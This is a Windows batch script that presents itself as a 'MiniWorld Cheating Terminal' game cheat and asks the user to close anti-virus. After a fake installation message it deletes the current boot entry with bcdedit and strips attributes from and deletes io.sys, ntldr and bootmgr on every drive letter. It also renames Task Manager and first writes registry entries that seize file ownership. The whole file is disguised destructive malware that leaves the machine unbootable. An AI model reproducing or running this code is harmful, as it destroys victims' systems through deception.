
echo off
echo Windows Registry Editor Version 5.00>mini.reg
echo [HKEY_CLASSES_ROOT\*\shell\runas]>>mini.reg
echo @="获取TrustedInstaller权限">>mini.reg
echo [HKEY_CLASSES_ROOT\*\shell\runas\command]>>mini.reg
echo @="cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F">>mini.reg
echo "IsolatedCommand"="cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F">>mini.reg
echo [HKEY_CLASSES_ROOT\Directory\shell\runas]>>mini.reg
echo @="获取TrustedInstaller权限">>mini.reg
echo "NoWorkingDirectory"="">>mini.reg
echo [HKEY_CLASSES_ROOT\Directory\shell\runas\command]>>mini.reg
echo @="cmd.exe /c takeown /f \"%1\" /r /d y && icacls \"%1\" /grant administrators:F /t">>mini.reg
echo "IsolatedCommand"="cmd.exe /c takeown /f \"%1\" /r /d y && icacls \"%1\" /grant administrators:F /t">>mini.reg

cls


echo MiniWorld Cheating Terminal
echo Please close all anti-virus application.
set/p option=Type MiniWorld Main Process: 
echo Installing MCT...
timeout /t 1 /nobreak
echo OK
cls
bcdedit /delete {current}
c:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

d:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

e:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

f:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

g:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

h:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

i:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

j:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

k:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

l:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

m:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

n:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

o:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

p:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

q:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

r:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

s:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

t:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

u:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

v:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

w:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

x:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

y:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

z:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr


a:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr

b:
cd \
attrib -s -r -h io.sys
attrib -s -r -h ntldr
attrib -s -r -h bootmgr
del /f /q io.sys
del /f /q ntldr
del /f /q bootmgr
pause
cls
c:
cd \
cd windows
cd system32
attrib -s -r -h taskmgr.exe
ren taskmgr.exe fuckmini.exe
md MCT
set /p option=FUCKMINIWORLD@FUCKMINI.DOG-C:\MCT